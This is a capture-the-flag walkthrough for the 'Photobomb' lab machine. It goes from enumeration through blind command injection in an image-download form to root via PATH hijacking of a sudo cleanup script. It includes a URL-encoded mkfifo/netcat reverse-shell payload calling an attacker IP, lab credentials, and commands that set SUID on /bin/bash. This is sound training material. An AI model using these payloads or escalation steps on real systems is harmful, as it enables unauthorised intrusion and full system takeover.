# Photobomb

Photobomb is a CTF that focuses on Command Injection, Relative Path Escalation, Sensitive Data Exposure and misconfigured permissions.

## Enumeration

Start off with an nmap scan which will look like this:

```vim
nmap -Pn -sV -sC -v <IP>
```

We get this information back from the scan:

```zsh
Nmap scan report for 10.10.11.182
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This just shows an ssh port and a web application are open. So we have to start exploring the web application.

We add the IP and photobomb.htb to `/etc/hosts` like this : `10.10.11.182	photobomb.htb`

Looking at the source code of the web application, we can see this line:

```html
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
  <script src="photobomb.js"></script>
</head>
```

`photobomb.js` seems interesting, lets look at the contents:

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

Here we can see `pH0t0:b0Mb!` which is the username and password which will be needed to log into `/printer`

Once we log in, There is a sort of photo downloader that can let us download images in JPG and PNG and different dimensions. The HTTP request intercepted from BurpSuite looks like this:

```http
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Origin: http://photobomb.htb
DNT: 1
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=png&dimensions=150x100
```

## Exploit

Ideally, we want to be able to achieve Remote Code Execution here. This is possible with command injection at the `filetype` parameter. The response doesn't get sent back to us, so it is blind RCE. Run `nc -lvnp <port>` craft the mkfifo nc reverse shell and URL encode it to send it to the parameter. Your payload should look something like this:

```http
photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=png%3brm%20%2ftmp%2ff%3bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7csh%20-i%202%3e%261%7cnc%2010.10.14.119%209000%20%3e%2ftmp%2ff&dimensions=150x100
```

Note: You have to have the payload like this, `filetype=png;<PAYLOAD>;`

You will now have a reverse shell and find the first flag in `/home/wizard/user.txt`

## Priv-Esc

Run `sudo -l`.

```vim
$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

We can see here that we can run `/opt/cleanup.sh` as root AND set our environment variable. Looking at `/opt/cleanup.sh` we see this:

```vim
$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

We see that most of the commands have an absolute path except `cd`,`find` and `chown`. Due to this misconfiguration, we can perform relative path escalation by running the following commands:

```vim
echo '#!/bin/bash' > find

echo 'chmod +s /bin/bash' >> find

echo 'bash -p' >> find

chmod 777 find
```

This will set the SUID bit of `/bin/bash` allowing for an easy root access and will let you directly enter root AND make the file executable for this exploit to work.

Lastly, run the following command:

```vim
sudo PATH=/home/wizard:$PATH /opt/cleanup.sh
```

Now, you will have a shell (It will be a blank line, but you can run commands just fine) and can find the root flag in `/root/root.txt`
